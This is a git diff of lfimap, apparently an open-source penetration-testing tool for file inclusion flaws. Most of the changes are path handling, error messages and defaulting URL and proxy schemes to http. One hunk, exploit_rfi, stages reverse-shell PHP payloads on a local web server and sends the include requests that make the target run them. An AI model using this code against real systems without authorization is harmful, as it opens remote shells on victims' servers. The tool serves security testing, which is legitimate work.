@@ -30,6 +30,8 @@ scriptName = ""
 tempArg = ""
 webDir = ""
 
+scriptDirectory = os.path.dirname(__file__)
+
 class ServerHandler(http.server.SimpleHTTPRequestHandler):
     def __init__(self, *args, **kwargs):
         super().__init__(*args, directory=webDir, **kwargs)
@@ -519,7 +521,7 @@ def test_rfi(url):
 
 def test_heuristics(url):
     if(args.verbose):
-        print("[i] Testing for info disclosure using heuristics...")
+        print("\n[i] Testing for info disclosure using heuristics...")
 
     tests = []
     tests.append("/?!%$$%!?/")
@@ -930,22 +932,20 @@ def exploit_rfi(exploit, method, ip, port):
     url = exploit['GETVAL']
     printInfo(ip, port, "php", "Remote File Inclusion")
     
-    includeServer = ""
-
     if(not args.postreq):
         if(exploit['OS'] == "windows"):
-            prepareRfiExploit("exploits/reverse_shell_win.php", webDir + os.path.sep + "reverse_shell_win_tmp.php", ip, port)
-            res = requests.get(url.replace(tempArg, includeServer + "reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
+            prepareRfiExploit(scriptDirectory + os.sep + "exploits/reverse_shell_win.php", webDir + os.path.sep + "reverse_shell_win_tmp.php", ip, port)
+            res = requests.get(url.replace(tempArg, "reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
         else:
-            prepareRfiExploit("exploits/reverse_shell_lin.php", webDir + os.path.sep + "reverse_shell_lin_tmp.php", ip, port)
-            res = requests.get(url.replace(tempArg, includeServer + "reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
+            prepareRfiExploit(scriptDirectory + os.sep + "exploits/reverse_shell_lin.php", webDir + os.path.sep + "reverse_shell_lin_tmp.php", ip, port)
+            res = requests.get(url.replace(tempArg, "reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
     else:
         if(exploit['OS'] == "linux"):
-            prepareRfiExploit("exploits/reverse_shell_lin.php", webDir + os.path.sep + "reverse_shell_lin_tmp.php", ip, port)
-            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, includeServer +  "reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
+            prepareRfiExploit(scriptDirectory + os.sep + "exploits/reverse_shell_lin.php", webDir + os.path.sep + "reverse_shell_lin_tmp.php", ip, port)
+            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, "reverse_shell_lin_tmp.php"), headers = headers, proxies = proxies)
         else:
-            prepareRfiExploit("exploits/reverse_shell_win.php", webDir + os.path.sep + "reverse_shell_win_tmp.php", ip, port) 
-            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, includeServer + "reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
+            prepareRfiExploit(scriptDirectory + os.sep + "exploits/reverse_shell_win.php", webDir + os.path.sep + "reverse_shell_win_tmp.php", ip, port) 
+            requests.post(url, data = exploit['POSTVAL'].replace(tempArg, "reverse_shell_win_tmp.php"), headers = headers, proxies = proxies)
     return
 
 
@@ -1269,10 +1269,10 @@ if(__name__ == "__main__"):
     cmdWordlist = args.cmdWordlist
     agent = args.agent
     referer = args.referer
-    
+   
     # Check if mandatory args are provided
     if(not args.f and not args.url):
-        print("[-] Error. Please make sure to specify url(-U) or wordlist(-F). For help specify -h or --help.")
+        print("[-] Mandatory arguments ('-U' or '-F') unspecified. Refer to help menu with '-h' or '--help'.")
         sys.exit(-1)
 
     # if '-F' is provided, set mode to file
@@ -1290,7 +1290,6 @@ if(__name__ == "__main__"):
         print("[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
     
     if(args.php_filter or args.php_input or args.php_data or args.php_expect or args.trunc or args.rfi or args.cmd or args.file or args.xss or args.test_all or not args.heuristics):
-        
         if(mode=="file"):
             # Check if file exists
             if(not os.path.exists(args.f)):
@@ -1310,31 +1309,36 @@ if(__name__ == "__main__"):
             if(args.param in args.url):
                 print("[-] Cannot do POST and GET mode testing at once. Exiting...\n")
                 sys.exit(-1)
+        
+    #If testing using GET this checks if provided URL is valid
+    urlRegex = re.compile(
+    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
+    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
+    r'localhost|' #localhost...
+    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
+    r'(?::\d+)?' # optional port
+    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
     
     if(mode != "file"):
-        #If testing using GET this checks if provided URL is valid
-        urlRegex = re.compile(
-        r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
-        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
-        r'localhost|' #localhost...
-        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
-        r'(?::\d+)?' # optional port
-        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
-    
+        if("http" not in url and "socks" not in url):
+            if(args.verbose): print("[i] No URL scheme provided. Defaulting to http.")
 
+            args.url = "http://" + url
+            url = "http://" + url
+            
         if(re.match(urlRegex, url) is None):
-            print("URL not valid, exiting...")
+            print("[-] URL not valid, exiting...")
             sys.exit(-1)
 
     #Check if provided trunc wordlist exists
     if(truncWordlist is not None):
         if(not os.path.isfile(truncWordlist)):
-            print("[-] Specified truncation wordlist '"+ truncWordlist + "' doesn't exist. Exiting...")
+            print("[-] Specified truncation wordlist '" + truncWordlist + "' doesn't exist. Exiting...")
             sys.exit(-1)
     else:
-        truncWordlist = "wordlists/short.txt"
+        truncWordlist = scriptDirectory + os.sep + "wordlists/short.txt"
         if((not os.path.exists(truncWordlist)) and (args.test_all or args.trunc)):
-            print("[-] Cannot find 'short.txt' wordlist. Since '-a' or '-t' was specified, lfimap will exit...")
+            print("[-] Cannot locate " + truncWordlist + " wordlist. Since '-a' or '-t' was specified, lfimap will exit...")
             sys.exit(-1)
     
     #Check if provided xss wordlist exists
@@ -1343,9 +1347,9 @@ if(__name__ == "__main__"):
             print("[-] Specified xss wordlist '" + xssWordlist + "' doesn't exist. Exiting...")
             sys.exit(-1)
     else:
-        xssWordlist = "wordlists/xss.txt"
+        xssWordlist = scriptDirectory + os.sep + "wordlists/xss.txt"
         if((not os.path.exists(xssWordlist)) and (args.test_all or args.xss)):
-            print("[-] Cannot find 'xss.txt' wordlist. Since '-a' or '--xss' was specified, lfimap will exit...")
+            print("[-] Cannot locate " + xssWordlist + " wordlist. Since '-a' or '--xss' was specified, lfimap will exit...")
             sys.exit(-1)
    
     #Check if provided cmd injection wordlist exists
@@ -1354,9 +1358,9 @@ if(__name__ == "__main__"):
             print("[-] Specified command injection wordlist '" + cmdWordlist + "' doesn't exist. Exiting...")
             sys.exit(-1)
     else:
-        cmdWordlist = "wordlists/cmdInjection.txt"
+        cmdWordlist = scriptDirectory + os.sep + "wordlists/cmdInjection.txt"
         if((not os.path.exists(cmdWordlist)) and (args.test_all or args.cmd)):
-            print("[-] Cannot find 'cmdInjection.txt' wordlist. Since '-a' or '--cmdinject' is specified, lfimap will exit...")
+            print("[-] Cannot locate " + cmdWordlist + " wordlist. Since '-a' or '--cmdinject' is specified, lfimap will exit...")
             sys.exit(-1)
 
     #Checks if '--lhost' and '--lport' are provided with '-x'
@@ -1381,17 +1385,17 @@ if(__name__ == "__main__"):
     
     #Check if proxy is correct
     if(args.proxyAddr):
-        if("http" in args.proxyAddr or "socks" in args.proxyAddr):
-            try:
-                r = requests.get(args.proxyAddr)
-                if(r.status_code >= 500):
-                    print("[-] Proxy server is available, but it returns server-side error code >=500. Exiting...")
-                    sys.exit(-1)
-            except:
-                print("[-] Proxy server is not available. Exiting...")
+        try:
+            if("http" not in args.proxyAddr and "socks" not in args.proxyAddr):
+                if(args.verbose): print("[i] No proxy scheme provided. Defaulting to http.")
+                args.proxyAddr = "http://" + args.proxyAddr
+
+            r = requests.get(args.proxyAddr)
+            if(r.status_code >= 500):
+                print("[-] Proxy is available, but it returns server-side error code >=500. Exiting...")
                 sys.exit(-1)
-        else: 
-            print("[-] Please specify proxy protocol: http://, https:// or socks5://. Exiting...")
+        except:
+            print("[-] Proxy is not available. Exiting...")
             sys.exit(-1)
     
     #Setup a temporary argument placeholder.
@@ -1430,10 +1434,10 @@ if(__name__ == "__main__"):
     if(args.httpheaders):
         for i in range(len(args.httpheaders)):
             if(":" not in args.httpheaders[i]):
-                print("'"+args.httpheaders[i]+"'" + " has no ':' to distinguish parameter name from value, exiting...")
+                print("[-] '"+args.httpheaders[i]+"'" + " has no ':' to distinguish parameter name from value. Exiting...")
                 sys.exit(-1)     
             elif(args.httpheaders[i][0] == ":"):
-                print("Header name cannot start with ':' character. Exiting...")
+                print("[-] Header name cannot start with ':' character. Exiting...")
                 sys.exit(-1)
             else:
                 addHeader(args.httpheaders[i].split(":",1)[0].replace(" ",""), args.httpheaders[i].split(":",1)[1].replace(" ", ""))
